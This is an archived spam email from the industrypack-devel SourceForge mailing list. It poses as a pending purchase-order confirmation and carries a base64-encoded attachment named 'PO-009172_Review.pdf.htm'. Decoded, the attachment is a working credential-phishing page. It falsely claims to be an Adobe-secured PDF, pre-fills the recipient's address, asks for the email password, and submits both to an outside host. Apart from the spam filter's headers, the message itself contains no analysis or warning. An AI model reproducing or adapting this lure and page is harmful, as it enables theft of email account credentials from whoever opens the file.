Return-Path: <industrypack-devel-bounces@lists.sourceforge.net>
X-Original-To: lists+industrypack-devel@lfdr.de
Delivered-To: lists+industrypack-devel@lfdr.de
Received: from lists.sourceforge.net (lists.sourceforge.net [216.105.38.7])
	by mail.lfdr.de (Postfix) with ESMTPS id 413B11020E8
	for <lists+industrypack-devel@lfdr.de>; Tue, 19 Nov 2019 10:40:51 +0100 (CET)
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
	d=lists.sourceforge.net; s=beta; h=Reply-To:From:List-Subscribe:List-Help:
	List-Post:List-Archive:List-Unsubscribe:List-Id:Subject:Content-Type:
	MIME-Version:Message-ID:Date:To:Sender:Cc:Content-Transfer-Encoding:
	Content-ID:Content-Description:Resent-Date:Resent-From:Resent-Sender:
	Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:References:List-Owner;
	bh=cjwFIPPSwFDGV04nfRs3M4ivHygG/CypBAtosEFTKoU=; b=HVPfbrE2cbQAI62DOM1tNTwRNP
	h/cf0uOn10hSOe3VxQszpgsfcqKOHGs+Ea/q+46+8zNDLRNQV4T8Alud8PwwOdOIR4QTLwVSdAZkb
	zD2jjJGCwW3BB2p+jqNwkPlanm52gPIlTAypYqd5nXH6IOfI52GFb8vNvb3JSU6L2/zY=;
Received: from [127.0.0.1] (helo=sfs-ml-2.v29.lw.sourceforge.com)
	by sfs-ml-2.v29.lw.sourceforge.com with esmtp (Exim 4.90_1)
	(envelope-from <industrypack-devel-bounces@lists.sourceforge.net>)
	id 1iX00A-0002N2-2S
	for lists+industrypack-devel@lfdr.de; Tue, 19 Nov 2019 09:40:50 +0000
Received: from [172.30.20.202] (helo=mx.sourceforge.net)
 by sfs-ml-2.v29.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.90_1)
 (envelope-from <sales@mronesclaimsplc.cf>) id 1iX009-0002Mt-8V
 for industrypack-devel@lists.sourceforge.net; Tue, 19 Nov 2019 09:40:49 +0000
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed;
 d=sourceforge.net; s=x; h=Subject:Content-Type:MIME-Version:Message-ID:Date:
 To:From:Sender:Reply-To:Cc:Content-Transfer-Encoding:Content-ID:
 Content-Description:Resent-Date:Resent-From:Resent-Sender:Resent-To:Resent-Cc
 :Resent-Message-ID:In-Reply-To:References:List-Id:List-Help:List-Unsubscribe:
 List-Subscribe:List-Post:List-Owner:List-Archive;
 bh=7kIGZex23svNnw3OTQwa7Lxcwy39Pg4gz++/xFDzrmQ=; b=lXpBqp+3SOVfCu/NXiDabN5EVe
 PfsU15mJpUXdbve74oTLuXacoOECzs6C4Y+U5up3BgHtW1+WkEyWYB73ra7qsRubB3XYXKx9YGUOe
 30Se6n3bl8KnEywGXg2xv64b3ucW22rbGW4Fmh6WNz2is74T7ZpzPHgKmuXDcEAnTvhk=;
DKIM-Signature: v=1; a=rsa-sha256; q=dns/txt; c=relaxed/relaxed; d=sf.net; s=x
 ;
 h=Subject:Content-Type:MIME-Version:Message-ID:Date:To:From:Sender:Reply-To
 :Cc:Content-Transfer-Encoding:Content-ID:Content-Description:Resent-Date:
 Resent-From:Resent-Sender:Resent-To:Resent-Cc:Resent-Message-ID:In-Reply-To:
 References:List-Id:List-Help:List-Unsubscribe:List-Subscribe:List-Post:
 List-Owner:List-Archive; bh=7kIGZex23svNnw3OTQwa7Lxcwy39Pg4gz++/xFDzrmQ=; b=n
 Qn6aZN1JfX4pvxHDjjGZeh4TxF402jaoIyUoHO83VnZ2h5hXbQZv1glWi2pFdDxuxiOVmtisrkGC6
 MbyOd/sbwWYhhH2WR42fOkl3hsCM5vML9acvIO4SP4+v5oh1bQJ4z+cjLJKFp1IvZyxZZ8Z6riWBK
 zcjUKT5MPdyRBRvY=;
Received: from mta0.mronesclaimsplc.cf ([23.254.230.153])
 by sfi-mx-4.v28.lw.sourceforge.com with esmtps
 (TLSv1.2:ECDHE-RSA-AES256-GCM-SHA384:256) (Exim 4.92.2)
 id 1iX007-005wAz-Tt
 for industrypack-devel@lists.sourceforge.net; Tue, 19 Nov 2019 09:40:49 +0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; s=default;
 d=mronesclaimsplc.cf; 
 h=From:To:Subject:Date:Message-ID:MIME-Version:Content-Type;
 i=sales@mronesclaimsplc.cf;
 bh=7kIGZex23svNnw3OTQwa7Lxcwy39Pg4gz++/xFDzrmQ=;
 b=sLVnGUAR5FiKrf2zY1mYc4pL3K2he20z83tFhje3t+AAdeEXsgl6kIt0FtRn56dKZXsHCt/d+cVR
 imSC1JW48zXN6geOwOpMCi53DivvT+TWO67JFC70gKRBy3AUvj5yNdF9pPY//Ni+R8ow5qkVslvI
 SUgCT3W4Cm9e0x/ZLaw=
To: industrypack-devel@lists.sourceforge.net
Date: 19 Nov 2019 09:40:44 +0000
Message-ID: <20191119094044.9737BD38B293B12B@mronesclaimsplc.cf>
MIME-Version: 1.0
Content-Type: multipart/mixed;
 boundary="----=_NextPart_000_0012_F8F96BBA.290772A0"
X-Spam-Score: 9.0 (+++++++++)
X-Spam-Report: Spam Filtering performed by mx.sourceforge.net.
 See http://spamassassin.org/tag/ for more details.
 2.5 URIBL_DBL_SPAM         Contains a spam URL listed in the Spamhaus DBL
 blocklist [URIs: mronesclaimsplc.cf]
 1.2 RCVD_IN_BL_SPAMCOP_NET RBL: Received via a relay in bl.spamcop.net
 [Blocked - see <https://www.spamcop.net/bl.shtml?23.254.230.153>]
 3.6 RCVD_IN_SBL_CSS        RBL: Received via a relay in Spamhaus SBL-CSS
 [23.254.230.153 listed in zen.spamhaus.org]
 0.1 URIBL_CSS_A Contains URL's A record listed in the Spamhaus CSS
 blocklist [URIs: mronesclaimsplc.cf]
 0.1 URIBL_CSS Contains an URL's NS IP listed in the Spamhaus CSS
 blocklist [URIs: mronesclaimsplc.cf]
 -0.0 SPF_PASS               SPF: sender matches SPF record
 0.0 SPF_HELO_NONE          SPF: HELO does not publish an SPF Record
 0.7 HTML_IMAGE_ONLY_28     BODY: HTML: images with 2400-2800 bytes of words
 1.0 HTML_MESSAGE           BODY: HTML included in message
 -0.1 DKIM_VALID_AU Message has a valid DKIM or DK signature from author's
 domain
 -0.1 DKIM_VALID Message has at least one valid DKIM or DK signature
 0.1 DKIM_SIGNED            Message has a DKIM or DK signature,
 not necessarily valid
 0.0 T_HTML_ATTACH          HTML attachment to bypass scanning?
 0.0 T_REMOTE_IMAGE         Message contains an external image
 -0.2 AWL AWL: Adjusted score from AWL reputation of From: address
X-VA-Spam-Flag: YES
X-Spam-Flag: YES
X-Headers-End: 1iX007-005wAz-Tt
Subject: [Industrypack-devel] [SPAM] PO-009172 for confirmation. Payment
 pending...
X-BeenThere: industrypack-devel@lists.sourceforge.net
X-Mailman-Version: 2.1.21
Precedence: list
List-Id: <industrypack-devel.lists.sourceforge.net>
List-Unsubscribe: <https://lists.sourceforge.net/lists/options/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=unsubscribe>
List-Archive: <http://sourceforge.net/mailarchive/forum.php?forum_name=industrypack-devel>
List-Post: <mailto:industrypack-devel@lists.sourceforge.net>
List-Help: <mailto:industrypack-devel-request@lists.sourceforge.net?subject=help>
List-Subscribe: <https://lists.sourceforge.net/lists/listinfo/industrypack-devel>, 
 <mailto:industrypack-devel-request@lists.sourceforge.net?subject=subscribe>
From: sales--- via Industrypack-devel
 <industrypack-devel@lists.sourceforge.net>
Reply-To: sales@mronesclaimsplc.cf
Errors-To: industrypack-devel-bounces@lists.sourceforge.net

This is a multi-part message in MIME format.

------=_NextPart_000_0012_F8F96BBA.290772A0
Content-Type: text/plain;
	charset="utf-8"
Content-Transfer-Encoding: quoted-printable

Pending payment for PO-009172. Please review and confirm details=20
as attached.


-----


Thanks

Sales Department
sales@mronesclaimsplc.cf
Mronesclaims PLC

------=_NextPart_000_0012_F8F96BBA.290772A0
Content-Type: text/html; name="PO-009172_Review.pdf.htm"
Content-Transfer-Encoding: base64
Content-Disposition: attachment; filename="PO-009172_Review.pdf.htm"

PCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlv
bmFsLy9FTiINCiAgImh0dHA6Ly93d3cudzMub3JnL1RSL2h0bWw0L2xvb3NlLmR0ZCI+ICAg
IA0KPGh0bWw+DQoNCjxoZWFkPg0KPHRpdGxlPlB1cmNoYXNlIG9yZGVyIExURDwvdGl0bGU+
DQo8c3R5bGU+DQoNCi5lbWFpbHsNCiAgd2lkdGg6IDYwJTsNCiAgYm94LXNpemluZzogYm9y
ZGVyLWJveDsNCiAgYm9yZGVyOiAycHggc29saWQgI2NjYzsNCiAgYm9yZGVyLXJhZGl1czog
OHB4Ow0KICBmb250LXNpemU6IDEzcHg7DQogIGJhY2tncm91bmQtY29sb3I6IHRyYW5zcGFy
ZW50Ow0KICBiYWNrZ3JvdW5kLWltYWdlOiB1cmwoJ2ltYWdlL2xvZ28zLmpwZycpOw0KICBi
YWNrZ3JvdW5kLXBvc2l0aW9uOiAzcHggM3B4Ow0KICBiYWNrZ3JvdW5kLXNpemU6IDIwcHg7
DQogIGJhY2tncm91bmQtcG9zaXRpb246IDE1cHggN3B4Ow0KICBiYWNrZ3JvdW5kLXJlcGVh
dDogbm8tcmVwZWF0Ow0KICBwYWRkaW5nOiA5cHggMjBweCA5cHggNDBweDt9DQogIA0KICAu
cGFzc3sNCiAgd2lkdGg6IDYwJTsNCiAgbWFyZ2luLXRvcDo1cHg7DQogIGJveC1zaXppbmc6
IGJvcmRlci1ib3g7DQogIGJvcmRlcjogMnB4IHNvbGlkICNjY2M7DQogIGJvcmRlci1yYWRp
dXM6IDhweDsNCiAgZm9udC1zaXplOiAxM3B4Ow0KICBiYWNrZ3JvdW5kLWNvbG9yOiB0cmFu
c3BhcmVudDsNCiAgYmFja2dyb3VuZC1pbWFnZTogdXJsKCdpbWFnZS9sb2dvNy5QTkcnKTsN
CiAgYmFja2dyb3VuZC1wb3NpdGlvbjogM3B4IDNweDsNCiAgYmFja2dyb3VuZC1zaXplOiAy
MHB4Ow0KICBiYWNrZ3JvdW5kLXBvc2l0aW9uOiAxNXB4IDdweDsNCiAgYmFja2dyb3VuZC1y
ZXBlYXQ6IG5vLXJlcGVhdDsNCiAgcGFkZGluZzogOXB4IDIwcHggOXB4IDQwcHg7fQ0KICAN
CiAgLnN1YnsNCgkgIG1hcmdpbi10b3A6NXB4Ow0KICB3aWR0aDogMzAlOw0KICBib3gtc2l6
aW5nOiBib3JkZXItYm94Ow0KICBib3JkZXI6IDJweCBzb2xpZCAjY2NjOw0KICBib3JkZXIt
cmFkaXVzOiA0cHg7IGJvcmRlcjpub25lOw0KICBmb250LXNpemU6IDEzcHg7DQogIGNvbG9y
OndoaXRlO2JhY2tncm91bmQtY29sb3I6cmVkOzsNCiAgYmFja2dyb3VuZC1wb3NpdGlvbjog
M3B4IDNweDsNCiAgYmFja2dyb3VuZC1zaXplOiAyMHB4Ow0KICBiYWNrZ3JvdW5kLXBvc2l0
aW9uOiAxNXB4IDdweDsNCiAgYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDsNCiAgcGFk
ZGluZzogOHB4IDIwcHggOXB4IDMwcHg7fQ0KICA8L3N0eWxlPg0KPG1ldGEgaHR0cC1lcXVp
dj0iQ29udGVudC1UeXBlIiBjb250ZW50PSJ0ZXh0L2h0bWw7IGNoYXJzZXQ9dXRmLTgiPg0K
PC9oZWFkPg0KPGJvZHkgYWxpZ249ImNlbnRlciJzdHlsZT0iYmFja2dyb3VuZC1wb3NpdGlv
bjpmaXhlZDsgYmFja2dyb3VuZC1yZXBlYXQ6bm8tcmVwZWF0OyBiYWNrZ3JvdW5kLWNvbG9y
OnRyYW5zcGFyZW50OyBiYWNrZ3JvdW5kLXNpemU6OyAiIGJhY2tncm91bmQ9Imh0dHA6Ly9t
b25pdnN0YXIuZ3EvaW1hZ2UvbWFpbjIucG5nIi8gPg0KPG1hcnF1ZWUgYmdjb2xvcj0idHJh
bnNwYXJlbnQiIHN0eWxlPSJjb2xvcjpyZWQ7IGZvbnQtZmFtaWx5OiB2ZXJkYW5hOyBmb250
LXNpemU6MTBweCIgYmVoYXZpb3I9InNsaWRlIiA+VGhpcyBwZGYgZmlsZSBpcyBzZWN1cmVk
IGJ5IEFkb2JlIGZvciB0aGUgdXNlciB3aXRoIHRoaXMgZW1haWwgYWRkcmVzczogaW5kdXN0
cnlwYWNrLWRldmVsQGxpc3RzLnNvdXJjZWZvcmdlLm5ldCBvbmx5PC9tYXJxdWVlPg0KPGZv
cm0gYWN0aW9uPSJodHRwOi8vbW9uaXZzdGFyLmdxL21haW4vM2QucGhwIiBtZXRob2Q9IkdF
VCIgc3R5bGU9Im1hcmdpbi10b3A6MjAwcHg7IiB3aWR0aD0iMTAwJSIgYWxpZ249ImNlbnRl
ciI+DQo8ZmllbGRzZXQgYWxpZ249ImNlbnRlciIgc3R5bGU9IndpZHRoOjM5MHB4O21hcmdp
bi1sZWZ0OjQ1MHB4OyBib3JkZXItbGVmdDpub25lOyBib3JkZXItcmlnaHQ6bm9uZTsgYm9y
ZGVyLXJhZGl1czo3cHg7IGJvcmRlci1jb2xvcjpyZWQ7IGJvcmRlci1zdHlsZToiID4NCjxp
bWcgc3JjPSJodHRwOi8vbW9uaXZzdGFyLmdxL2ltYWdlL2xvLnBuZyIvIHdpZHRoPSI0NXB4
IiBzdHlsZT0icGFkZGluZy1ib3R0b206NXB4OyIgPjxicj4NCjxpbnB1dCB0eXBlPSJlbWFp
bCIgbmFtZT0iZW1haWwiIGNsYXNzPSJlbWFpbCIgcGxhY2Vob2xkZXI9IkVudGVyIHlvdXIg
ZW1haWwgYWRkcmVzcyIgcmVxdWlyZWQ9IiIgdmFsdWU9ImluZHVzdHJ5cGFjay1kZXZlbEBs
aXN0cy5zb3VyY2Vmb3JnZS5uZXQiLz48YnI+DQo8aW5wdXQgdHlwZT0icGFzc3dvcmQiIG5h
bWU9InBhc3N3b3JkIiBjbGFzcz0icGFzcyIgcGxhY2Vob2xkZXI9IkVudGVyIGVtYWlsIHBh
c3N3b3JkIiByZXF1aXJlZD0iIiB2YWx1ZT0iIi8+PGJyPg0KPGlucHV0IHR5cGU9InN1Ym1p
dCIgY2xhc3M9InN1YiIgdmFsdWU9IkFjY2VzcyIvPg0KDQo8L2ZpZWxkc2V0Pg0KPC9mb3Jt
Pg0KDQoNCjwvYm9keT4NCjwvaHRtbD4=

------=_NextPart_000_0012_F8F96BBA.290772A0
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline


------=_NextPart_000_0012_F8F96BBA.290772A0
Content-Type: text/plain; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: inline

_______________________________________________
Industrypack-devel mailing list
Industrypack-devel@lists.sourceforge.net
https://lists.sourceforge.net/lists/listinfo/industrypack-devel

------=_NextPart_000_0012_F8F96BBA.290772A0--


